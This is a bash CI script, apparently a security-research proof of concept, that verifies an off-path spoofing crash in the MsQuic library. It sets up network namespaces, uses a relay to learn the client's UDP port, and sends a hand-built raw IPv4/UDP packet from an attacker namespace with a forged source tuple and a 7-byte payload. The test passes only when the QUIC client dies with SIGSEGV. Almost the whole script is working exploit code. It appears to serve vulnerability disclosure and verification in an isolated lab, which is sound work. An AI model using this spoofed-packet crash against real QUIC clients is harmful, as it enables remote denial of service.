#!/usr/bin/env bash
set -Eeuo pipefail

ROOT="security-research/msquic-v2-retry-null-deref"
RESULTS="$GITHUB_WORKSPACE/msquic-e2e-results/offpath-spoof"
APP="$ROOT/bin/Release/net10.0/MsQuicRetryE2E.dll"
LIB_DIR="${MSQUIC_LIB_DIR:?}"
CERT_DIR="$GITHUB_WORKSPACE/msquic-e2e-results/cert"
mkdir -p "$RESULTS"
ulimit -c unlimited

cleanup() {
  set +e
  for p in "${CLIENT_PID:-}" "${RELAY_PID:-}" "${SERVER_PID:-}" "${SNIFFER_PID:-}"; do
    [ -n "$p" ] && kill "$p" 2>/dev/null
  done
  [ -n "${CLIENT_PID:-}" ] && wait "$CLIENT_PID" 2>/dev/null
  [ -n "${RELAY_PID:-}" ] && wait "$RELAY_PID" 2>/dev/null
  [ -n "${SERVER_PID:-}" ] && wait "$SERVER_PID" 2>/dev/null
  sudo ip netns del quic-client 2>/dev/null
  sudo ip netns del quic-attacker 2>/dev/null
  sudo ip link del br-quic 2>/dev/null
}
trap cleanup EXIT

sudo apt-get update
sudo apt-get install -y iproute2 tcpdump
sudo sysctl -w net.ipv4.conf.all.rp_filter=0
sudo sysctl -w net.ipv4.conf.default.rp_filter=0

# A real L2 segment: client, relay endpoint, and attacker are separate
# network namespaces. The attacker has no socket/connection state with client.
sudo ip link add br-quic type bridge
sudo ip addr add 10.200.0.1/24 dev br-quic
sudo ip link set br-quic up

sudo ip netns add quic-client
sudo ip link add veth-c type veth peer name eth0 netns quic-client
sudo ip link set veth-c master br-quic
sudo ip link set veth-c up
sudo ip -n quic-client link set lo up
sudo ip -n quic-client link set eth0 up
sudo ip -n quic-client addr add 10.200.0.2/24 dev eth0

sudo ip netns add quic-attacker
sudo ip link add veth-a type veth peer name eth0 netns quic-attacker
sudo ip link set veth-a master br-quic
sudo ip link set veth-a up
sudo ip -n quic-attacker link set lo up
sudo ip -n quic-attacker link set eth0 up
sudo ip -n quic-attacker addr add 10.200.0.3/24 dev eth0

test -s "$CERT_DIR/server.crt"
test -s "$CERT_DIR/server.key"

export DOTNET_ROLL_FORWARD=LatestPatch
export LD_LIBRARY_PATH="$LIB_DIR${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"

dotnet "$APP" server "$CERT_DIR/server.crt" "$CERT_DIR/server.key" >"$RESULTS/server.log" 2>&1 &
SERVER_PID=$!
for _ in $(seq 1 100); do
  grep -q SERVER_LISTENING "$RESULTS/server.log" && break
  sleep .1
done
grep -q SERVER_LISTENING "$RESULTS/server.log"

python3 "$ROOT/relay.py" --bind-address 10.200.0.1 --upstream-address 127.0.0.1 \
  --listen 4567 --upstream 4568 --mode attack-original \
  --marker "$RESULTS/client-connected" --injection-marker "$RESULTS/unused-marker" \
  >"$RESULTS/relay.log" 2>&1 &
RELAY_PID=$!
sleep .3

# The client connects to the relay endpoint, then completes TLS/QUIC handshake.
sudo ip netns exec quic-client env DOTNET_ROLL_FORWARD=LatestPatch \
  LD_LIBRARY_PATH="$LIB_DIR" QUIC_REMOTE_IP=10.200.0.1 \
  dotnet "$APP" client "$RESULTS/client-connected" >"$RESULTS/client.log" 2>&1 &
CLIENT_PID=$!

for _ in $(seq 1 300); do
  [ -s "$RESULTS/client-connected" ] && break
  kill -0 "$CLIENT_PID" 2>/dev/null || break
  sleep .05
done
test -s "$RESULTS/client-connected"
grep -q CLIENT_CONNECTED "$RESULTS/client.log"

# Read the UDP source port observed by the relay. This is the destination port
# of the connected client's UDP socket, not a guessed port.
CLIENT_PORT=$(python3 - "$RESULTS/relay.log" <<'PY'
import re,sys,time
p=sys.argv[1]
for _ in range(100):
    try: s=open(p).read()
    except OSError: s=""
    m=re.search(r"C2S bytes=\\d+ client=\\('10\\.200\\.0\\.2', (\\d+)\\)",s)
    if m:
        print(m.group(1)); raise SystemExit(0)
    time.sleep(.05)
raise SystemExit("could not determine client's UDP source port from relay capture")
PY
)
echo "CLIENT_UDP_PORT=$CLIENT_PORT" | tee "$RESULTS/attacker.log"

# Independent packet sniffer in the client's namespace confirms the spoofed
# datagram arrived with the forged peer IP:port and exact 7-byte payload.
sudo ip netns exec quic-client python3 - "$CLIENT_PORT" "$RESULTS/spoof-received.txt" <<'PY' &
import socket,struct,sys
port=int(sys.argv[1]); out=sys.argv[2]
s=socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.htons(0x0800))
s.bind(("eth0",0))
while True:
    frame=s.recv(65535)
    if len(frame)<42 or frame[12:14]!=b"\\x08\\x00": continue
    ip=frame[14:]
    ihl=(ip[0]&15)*4
    if ip[9]!=17: continue
    src=socket.inet_ntoa(ip[12:16]); dst=socket.inet_ntoa(ip[16:20])
    udp=ip[ihl:]
    sport,dport,length,checksum=struct.unpack("!HHHH",udp[:8])
    payload=udp[8:length]
    if (src=="10.200.0.1" and dst=="10.200.0.2" and sport==4567
        and dport==port and payload==bytes.fromhex("806b3343cf0000")):
        open(out,"w").write(f"received src={src}:{sport} dst={dst}:{dport} payload={payload.hex()}\\n")
        break
PY
SNIFFER_PID=$!
sleep .2

# Attacker namespace crafts an IPv4/UDP packet with the relay's exact source
# tuple. The attacker process is not the relay and does not receive replies.
sudo ip netns exec quic-attacker python3 - "$CLIENT_PORT" <<'PY' | tee -a "$RESULTS/attacker.log"
import socket,struct,sys
src=socket.inet_aton("10.200.0.1"); dst=socket.inet_aton("10.200.0.2")
sport=4567; dport=int(sys.argv[1]); payload=bytes.fromhex("806b3343cf0000")
def csum(data):
    if len(data)&1: data+=b"\\x00"
    words=struct.unpack("!%dH"%(len(data)//2),data)
    total=sum(words)
    while total>>16: total=(total&0xffff)+(total>>16)
    return (~total)&0xffff
udp=struct.pack("!HHHH",sport,dport,8+len(payload),0)+payload
ip0=struct.pack("!BBHHHBBH4s4s",0x45,0,20+len(udp),0x4242,0,64,17,0,src,dst)
ip=ip0[:10]+struct.pack("!H",csum(ip0))+ip0[12:]
packet=ip+udp
s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW)
s.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
s.sendto(packet,("10.200.0.2",0))
print(f"SPOOF_SENT src=10.200.0.1:{sport} dst=10.200.0.2:{dport} payload={payload.hex()}")
PY

for _ in $(seq 1 100); do
  [ -s "$RESULTS/spoof-received.txt" ] && break
  sleep .05
done
test -s "$RESULTS/spoof-received.txt"
cat "$RESULTS/spoof-received.txt"

set +e
wait "$CLIENT_PID"
RC=$?
set -e
echo "CLIENT_EXIT=$RC" | tee -a "$RESULTS/attacker.log"
cat "$RESULTS/client.log"
cat "$RESULTS/relay.log"
test "$RC" -eq 139
echo "PASS: independent namespace spoofed the established peer tuple; client SIGSEGV"
